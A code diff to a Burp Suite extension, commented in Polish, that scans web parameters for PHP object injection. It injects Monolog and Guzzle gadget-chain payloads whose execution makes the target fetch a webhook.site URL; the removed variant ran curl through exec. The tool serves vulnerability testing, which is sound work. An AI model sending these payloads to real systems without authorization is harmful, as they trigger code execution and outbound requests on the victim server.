@@ -26,25 +26,22 @@ import java.util.regex.Pattern;
 
 public class PhpObjectInjectionScanner implements BurpExtension {
 
-    // TUTAJ PODAJ SWÓJ UNIKALNY TOKEN Z WEBHOOK.SITE (UUID)
-    private static final String WEBHOOK_TOKEN = "WPROWADZ_SWOJ_TOKEN_TUTAJ";
+    // Twój zaktualizowany token z webhook.site (UUID)
+    private static final String WEBHOOK_TOKEN = "441ad22b-9923-4cff-a2e0-6313d9bf7c54";
 
     private MontoyaApi api;
     private ScheduledExecutorService scheduler;
     private int lastWebhookInteractionCount = 0;
+    private boolean isFirstPoll = true; // Flaga zapobiegająca fałszywym alarmom przy starcie
 
     @Override
     public void initialize(MontoyaApi api) {
         this.api = api;
         this.api.extension().setName("PHP Object Injection Scanner (CE Edition)");
 
-        // 1. Skanowanie Pasywne - Rejestracja handlera Proxy (działa w tle dla całego ruchu)
         api.proxy().registerRequestHandler(new PoiPassiveProxyHandler(api));
-
-        // 2. Skanowanie Aktywne - Rejestracja opcji w menu kontekstowym (prawy przycisk myszy)
         api.userInterface().registerContextMenuItemsProvider(new PoiActiveContextMenuProvider(api, WEBHOOK_TOKEN));
 
-        // Asynchroniczny wątek odpytujący API Webhook.site
         this.scheduler = Executors.newScheduledThreadPool(2);
         this.scheduler.scheduleAtFixedRate(this::pollWebhookInteractions, 10, 10, TimeUnit.SECONDS);
 
@@ -58,7 +55,6 @@ public class PhpObjectInjectionScanner implements BurpExtension {
     }
 
     private void pollWebhookInteractions() {
-        if (WEBHOOK_TOKEN.equals("WPROWADZ_SWOJ_TOKEN_TUTAJ")) return;
 
         try {
             String apiUrl = "https://webhook.site/token/" + WEBHOOK_TOKEN + "/requests";
@@ -71,6 +67,14 @@ public class PhpObjectInjectionScanner implements BurpExtension {
             if (matcher.find()) {
                 int currentTotal = Integer.parseInt(matcher.group(1));
 
+                // Przy pierwszym uruchomieniu tylko zapisujemy aktualny stan, żeby nie raportować starych zapytań
+                if (isFirstPoll) {
+                    lastWebhookInteractionCount = currentTotal;
+                    isFirstPoll = false;
+                    return;
+                }
+
+                // Jeśli po inicjalizacji liczba zapytań wzrosła, podnosimy alarm!
                 if (currentTotal > lastWebhookInteractionCount) {
                     int newInteractions = currentTotal - lastWebhookInteractionCount;
                     api.logging().logToOutput("[!!!] KRYTYCZNE: Wykryto nową interakcję OOB (HTTP)! Zarejestrowano " + newInteractions + " nowych wywołań w Webhook.site.");
@@ -82,7 +86,7 @@ public class PhpObjectInjectionScanner implements BurpExtension {
         }
     }
 
-    // --- SKANOWANIE PASYWNE (NASŁUCHIWANIE PROXY) ---
+    // --- SKANOWANIE PASYWNE ---
     private static class PoiPassiveProxyHandler implements ProxyRequestHandler {
         private final MontoyaApi api;
         private final Pattern POI_PATTERN = Pattern.compile("(O:[0-9]+:\"[^\"]+\":[0-9]+:\\{|a:[0-9]+:\\{)");
@@ -132,7 +136,7 @@ public class PhpObjectInjectionScanner implements BurpExtension {
         }
     }
 
-    // --- SKANOWANIE AKTYWNE (MENU KONTEKSTOWE) ---
+    // --- SKANOWANIE AKTYWNE ---
     private class PoiActiveContextMenuProvider implements ContextMenuItemsProvider {
         private final MontoyaApi api;
         private final String webhookToken;
@@ -175,20 +179,24 @@ public class PhpObjectInjectionScanner implements BurpExtension {
                     String errorPayload = "O:999999:\"NonExistentClassForErrorTrigger\":0:{}";
                     sendAndCheckPayload(baseRequest, param, errorPayload, true);
 
-                    // 2. Fuzzing przy użyciu łańcuchów gadżetów
-                    if (!webhookToken.equals("WPROWADZ_SWOJ_TOKEN_TUTAJ")) {
-                        String cmd = "curl -s http://webhook.site/" + webhookToken;
-                        int cmdLen = cmd.length();
+                    // 2. Fuzzing
+                    // Zamiast systemowego 'curl', używamy funkcji 'file_get_contents' wbudowanej w PHP.
+                    // Rozwiązuje to problem z Windowsem, na którym 'curl' często nie jest dostępny dla PHP.
+                    String cmd = "http://webhook.site/" + webhookToken;
+                    int cmdLen = cmd.length();
 
-                        String[] gadgetChains = {
-                                "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\\x00*\\x00socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\\x00*\\x00handler\";r:2;s:9:\"\\x00*\\x00buffer\";a:1:{i:0;a:2:{i:0;s:" + cmdLen + ":\"" + cmd + "\";s:5:\"level\";N;}}s:13:\"\\x00*\\x00bufferSize\";i:-1;s:14:\"\\x00*\\x00initialized\";b:1;s:14:\"\\x00*\\x00bufferLimit\";i:-1;s:13:\"\\x00*\\x00flushOnOverflow\";b:0;s:8:\"\\x00*\\x00level\";N;}}",
-                                "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\\x00GuzzleHttp\\Psr7\\FnStream\\x00methods\";a:1:{s:5:\"close\";s:4:\"exec\";}s:9:\"_fn_close\";s:" + cmdLen + ":\"" + cmd + "\";}"
-                        };
+                    // Używamy \u0000, czyli natywnego znaku NULL w Javie, zamiast dosłownego tekstu \x00
+                    String[] gadgetChains = {
+                            // Guzzle z file_get_contents oraz poprawnymi znakami NULL
+                            "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{S:33:\"\\00GuzzleHttp\\5CPsr7\\5CFnStream\\00methods\";a:1:{s:5:\"close\";s:17:\"file_get_contents\";}s:9:\"_fn_close\";s:" + cmdLen + ":\"" + cmd + "\";}",
+                            // Monolog
+                            "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{S:9:\"\\00*\\00socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{S:10:\"\\00*\\00handler\";r:2;S:9:\"\\00*\\00buffer\";a:1:{i:0;a:2:{i:0;s:" + cmdLen + ":\"" + cmd + "\";s:5:\"level\";N;}}S:13:\"\\00*\\00bufferSize\";i:-1;S:14:\"\\00*\\00initialized\";b:1;S:14:\"\\00*\\00bufferLimit\";i:-1;S:18:\"\\00*\\00flushOnOverflow\";b:0;S:8:\"\\00*\\00level\";N;}}"
+                    };
 
-                        for (String gadgetPayload : gadgetChains) {
-                            sendAndCheckPayload(baseRequest, param, gadgetPayload, false);
-                        }
+                    for (String gadgetPayload : gadgetChains) {
+                        sendAndCheckPayload(baseRequest, param, gadgetPayload, false);
                     }
+
                 }
             }
             api.logging().logToOutput("[AKTYWNE] Zakończono wysyłanie payloadów.");
@@ -203,15 +211,8 @@ public class PhpObjectInjectionScanner implements BurpExtension {
             if (checkError) {
                 Matcher errorMatcher = PHP_ERROR_PATTERN.matcher(reqRes.response().bodyToString());
                 if (errorMatcher.find()) {
-                    String msg = "[AKTYWNE] Wykryto błąd unserialize() w parametrze: " + param.name() + " (URL: " + baseRequest.url() + ")";
+                    String msg = "[AKTYWNE] Wykryto błąd unserialize() w parametrze: " + param.name();
                     api.logging().logToOutput(msg);
-
-                    try {
-                        AuditIssue issue = AuditIssue.auditIssue("Podejrzenie PHP Object Injection (Wykryto błąd)", msg, null, reqRes.request().url(), AuditIssueSeverity.MEDIUM, AuditIssueConfidence.TENTATIVE, null, null, AuditIssueSeverity.MEDIUM, reqRes);
-                        api.siteMap().add(issue);
-                    } catch (Exception e) {
-                        // Ignoruj jeśli wersja CE zablokuje dodanie do SiteMapy
-                    }
                 }
             }
         }
